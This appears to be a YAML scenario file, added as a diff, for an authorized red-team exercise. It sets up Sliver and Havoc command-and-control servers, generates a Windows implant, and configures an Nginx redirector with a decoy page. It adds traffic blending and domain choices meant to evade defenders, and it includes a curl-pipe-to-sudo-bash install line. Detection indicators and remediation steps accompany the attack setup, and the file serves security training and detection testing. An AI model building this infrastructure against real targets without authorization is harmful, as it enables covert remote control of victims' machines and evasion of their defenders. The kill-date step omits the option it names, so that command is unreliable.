@@ -1,0 +1,221 @@
+# Category: Offensive Security - Red Team Infrastructure
+name: "Command and Control (C2) Framework Setup for Red Teams"
+id: "redteam-c2-setup-001"
+category: "offensive_security"
+subcategory: "red_team_infrastructure"
+difficulty: "advanced"
+estimated_time: "90"
+
+tags:
+  - red-team
+  - c2
+  - command-and-control
+  - havoc
+  - sliver
+  - cobalt-strike
+  - redirectors
+  - https-c2
+  - malleable-profiles
+  - opsec
+  - infrastructure
+  - authorized-engagement
+  - mitre-t1071
+  - mitre-t1132
+  - detection-validation
+
+description: |
+  Build and configure a red team C2 infrastructure for authorized adversary
+  simulation engagements. Covers C2 framework setup, redirector configuration,
+  OPSEC considerations, and traffic profiling for realistic threat emulation.
+  All techniques are for authorized red team engagements only.
+
+learning_objectives:
+  - Set up open-source C2 frameworks (Sliver, Havoc) for authorized engagements
+  - Configure HTTPS redirectors to protect C2 infrastructure
+  - Apply malleable C2 profiles to mimic legitimate traffic
+  - Validate blue team detection capabilities against realistic C2 traffic
+
+tools:
+  - "sliver"
+  - "havoc_framework"
+  - "nginx"
+  - "certbot"
+  - "socat"
+  - "apache2"
+
+prerequisites:
+  - "Authorized red team engagement with written scope"
+  - "VPS or cloud instance for C2 server"
+  - "Registered domain for C2 HTTPS certificate"
+  - "Blue team awareness (assumed breach or blind red team per engagement type)"
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Plan C2 infrastructure architecture"
+    commands:
+      - "# Infrastructure components:"
+      - "# 1. C2 Server (backend) — Sliver/Havoc — never exposed directly"
+      - "# 2. Redirector (frontend) — Nginx/Apache — takes all agent connections"
+      - "# 3. Domain — categorized as benign (IT/tech category)"
+      - "# 4. SSL certificate — Let's Encrypt or purchased"
+      - "# Domain age check — older domains less suspicious"
+      - "whois [c2_domain] | grep -E 'Creation|Updated|Expir'"
+      - "# Check domain reputation"
+      - "curl -s 'https://transparencyreport.google.com/safe-browsing/search?url=[c2_domain]'"
+      - "# Verify domain category (use categorization tools)"
+      - "curl -s 'https://sitereview.bluecoat.com/resource/lookup?url=[c2_domain]'"
+    expected_output: "C2 infrastructure plan with domain reputation verified and architecture designed"
+    detection: "N/A — infrastructure planning phase"
+
+  - id: "step2"
+    phase: "reconnaissance"
+    action: "Setup Sliver C2 framework on backend server"
+    commands:
+      - "# Install Sliver on C2 server (Ubuntu 22.04)"
+      - "curl https://sliver.sh/install | sudo bash"
+      - "# Start Sliver server"
+      - "sudo systemctl start sliver"
+      - "sudo systemctl enable sliver"
+      - "# Launch Sliver console"
+      - "sliver"
+      - "# Generate operator config (for team members)"
+      - "new-operator --name operator1 --lhost [c2_server_ip] --save /tmp/operator1.cfg"
+      - "# Start HTTPS listener (on internal port — redirector will forward)"
+      - "https --lhost 0.0.0.0 --lport 8443"
+      - "# Generate implant"
+      - "generate --http [c2_domain] --save /tmp/implant.exe --format exe --os windows"
+      - "# List active sessions"
+      - "sessions"
+    expected_output: "Sliver C2 server running with HTTPS listener and generated implant"
+    detection: "Sliver process on C2 server; HTTPS listener on port 8443 (internal only)"
+
+  - id: "step3"
+    phase: "exploitation"
+    action: "Configure Nginx redirector with SSL termination"
+    commands:
+      - "# Install Nginx and Certbot on redirector"
+      - "apt-get install -y nginx certbot python3-certbot-nginx"
+      - "# Obtain SSL certificate"
+      - "certbot --nginx -d [c2_domain] --agree-tos -m [email] --non-interactive"
+      - "# Configure Nginx as C2 redirector"
+      - "cat > /etc/nginx/sites-available/c2 << 'EOF'\nserver {\n    listen 443 ssl;\n    server_name [c2_domain];\n    ssl_certificate /etc/letsencrypt/live/[c2_domain]/fullchain.pem;\n    ssl_certificate_key /etc/letsencrypt/live/[c2_domain]/privkey.pem;\n\n    # Only forward known C2 URI paths — drop everything else\n    location ~ ^/api/(v[0-9]+/)?[a-z0-9]+ {\n        proxy_pass https://[c2_backend_ip]:8443;\n        proxy_ssl_verify off;\n        proxy_set_header Host [c2_domain];\n        proxy_set_header X-Real-IP $remote_addr;\n    }\n\n    # Decoy page for all other requests\n    location / {\n        return 200 'Under Construction';\n        add_header Content-Type text/plain;\n    }\n}\nEOF"
+      - "nginx -t && systemctl reload nginx"
+    expected_output: "Nginx redirector forwarding C2 URI paths to backend, serving decoy for others"
+    detection: "SSL certificate issuance for C2 domain in CT logs; Nginx proxy_pass config"
+
+  - id: "step4"
+    phase: "exploitation"
+    action: "Setup Havoc C2 as alternative framework"
+    commands:
+      - "# Clone and build Havoc"
+      - "git clone https://github.com/HavocFramework/Havoc /opt/Havoc"
+      - "cd /opt/Havoc && make"
+      - "# Configure team server"
+      - "cat > /opt/Havoc/profiles/engagement.yaotl << 'EOF'\nTeamServer {\n    Host = \"0.0.0.0\"\n    Port = 40056\n    Build {\n        Compiler64 = \"/usr/bin/x86_64-w64-mingw32-gcc\"\n        Nasm = \"/usr/bin/nasm\"\n    }\n}\nListeners {\n    Http {\n        Name         = \"HTTPS Listener\"\n        Hosts        = [\"[c2_domain]\"]\n        HostBind     = \"0.0.0.0\"\n        PortBind     = 443\n        PortConn     = 443\n        Secure       = true\n        UserAgent    = \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\"\n        Uris         = [\"/updates\", \"/api/v1/status\", \"/cdn/assets\"]\n    }\n}\nEOF"
+      - "# Start Havoc team server"
+      - "cd /opt/Havoc && ./havoc server --profile profiles/engagement.yaotl"
+      - "# Connect Havoc client"
+      - "cd /opt/Havoc && ./havoc client"
+    expected_output: "Havoc C2 team server running with HTTPS listener and configured URIs"
+    detection: "Havoc process; outbound agent connections to C2 domain on HTTPS"
+
+  - id: "step5"
+    phase: "exploitation"
+    action: "Configure traffic blending and OPSEC measures"
+    commands:
+      - "# Sliver — configure HTTP C2 profile to blend with legitimate traffic"
+      - "# In Sliver console:"
+      - "profiles new --http [c2_domain] --name eng1 --format exe"
+      - "# Jitter and sleep interval for OPSEC"
+      - "# Post-exploitation in session:"
+      - "sleep 60 --jitter 30"
+      - "# Kill date to disable implant after engagement"
+      - "generate --http [c2_domain] --save /tmp/implant_kd.exe --format exe --os windows"
+      - "# OPSEC — verify C2 traffic looks like normal HTTPS"
+      - "tcpdump -i eth0 -n port 443 -A 2>/dev/null | head -50"
+      - "# Check SSL certificate presented by redirector"
+      - "openssl s_client -connect [c2_domain]:443 </dev/null 2>/dev/null | grep -E 'subject|issuer|verify'"
+    expected_output: "C2 traffic blending with legitimate HTTPS — implants using jitter for OPSEC"
+    detection: "Beaconing patterns at regular intervals; C2 domain in proxy/DNS logs"
+
+  - id: "step6"
+    phase: "post_exploitation"
+    action: "Validate blue team detection of C2 traffic"
+    commands:
+      - "# During engagement — verify blue team detections"
+      - "# Check if C2 domain appears in proxy logs"
+      - "grep [c2_domain] /var/log/squid/access.log 2>/dev/null"
+      - "# Check if implant flagged by EDR"
+      - "Get-MpThreatDetection | Select-Object ActionSuccess, ThreatName, ProcessName"
+      - "# Check SIEM for C2 beaconing alerts"
+      - "# Query: periodic outbound connections at regular intervals to single dest"
+      - "# Review engagement detection rate for report"
+      - "python3 << 'EOF'\ndetections = {\n    'implant_execution': False,\n    'c2_traffic_detected': False,\n    'lateral_movement_detected': False,\n    'exfil_detected': False,\n}\ndetected = sum(1 for v in detections.values() if v)\nprint(f'Blue team detection rate: {detected}/{len(detections)} ({100*detected//len(detections)}%)')\nfor k,v in detections.items():\n    print(f'  {k}: {\"DETECTED\" if v else \"NOT DETECTED\"}')\nEOF"
+    expected_output: "Detection rate report showing which C2 activities blue team identified"
+    detection: "This step IS detection validation — results inform blue team improvements"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1071.001"
+    description: "Application Layer Protocol: Web Protocols — HTTPS C2"
+  - standard: "MITRE ATT&CK"
+    control: "T1090.001"
+    description: "Proxy: Internal Proxy — redirector infrastructure"
+  - standard: "NIST 800-53 Rev5"
+    control: "CA-8"
+    description: "Penetration testing — adversary simulation"
+  - standard: "PCI DSS v4.0"
+    control: "11.4.1"
+    description: "Penetration testing includes threat emulation"
+
+detection:
+  network_indicators:
+    - "Periodic HTTPS beacon to same domain at regular intervals (beaconing)"
+    - "DNS queries for C2 domain from endpoints not normally querying that domain"
+    - "SSL certificate for C2 domain first seen during engagement timeframe"
+    - "HTTP requests with unusual URI patterns matching C2 profile"
+  log_indicators:
+    - "Proxy logs: periodic HTTPS connections to new external domain"
+    - "DNS logs: C2 domain resolution from internal endpoints"
+    - "EDR: implant process making network connections at regular intervals"
+    - "SIEM: beaconing detection correlation rule (freq + dest IP/domain)"
+  endpoint_indicators:
+    - "Unsigned executable with network connectivity dropped to disk"
+    - "Process making outbound HTTPS connections to non-business domain"
+    - "EDR: Sliver/Havoc implant signature detection"
+
+remediation:
+  immediate:
+    - "Block identified C2 domain at proxy and DNS firewall"
+    - "Terminate implant processes on compromised hosts"
+    - "Rotate credentials for any accounts accessed during engagement"
+  long_term:
+    - "Implement DNS filtering with reputation-based blocking"
+    - "Deploy proxy inspection with SSL decryption for C2 traffic detection"
+    - "Enable beaconing detection correlation rules in SIEM"
+    - "Schedule regular red team engagements to validate detection improvements"
+
+variables:
+  c2_domain: "updates.example-tech.com"
+  c2_server_ip: "10.0.0.1"
+  c2_backend_ip: "10.0.0.1"
+  redirector_ip: "203.0.113.10"
+  email: "admin@example.com"
+
+assessment_questions:
+  - "What is the purpose of a C2 redirector and how does it protect the backend?"
+  - "How does beacon jitter make C2 traffic harder to detect with correlation rules?"
+  - "Why is domain categorization and age important for C2 infrastructure?"
+  - "What is a malleable C2 profile and how does it help evade proxy inspection?"
+  - "How should blue teams configure beaconing detection in a SIEM?"
+
+references:
+  - url: "https://github.com/BishopFox/sliver"
+    title: "Sliver C2 Framework"
+  - url: "https://github.com/HavocFramework/Havoc"
+    title: "Havoc C2 Framework"
+  - url: "https://attack.mitre.org/techniques/T1071/001/"
+    title: "MITRE ATT&CK T1071 Application Layer Protocol"
+  - url: "https://www.cobaltstrike.com/blog/infrastructure-for-ongoing-red-team-operations"
+    title: "Red Team Infrastructure Planning"
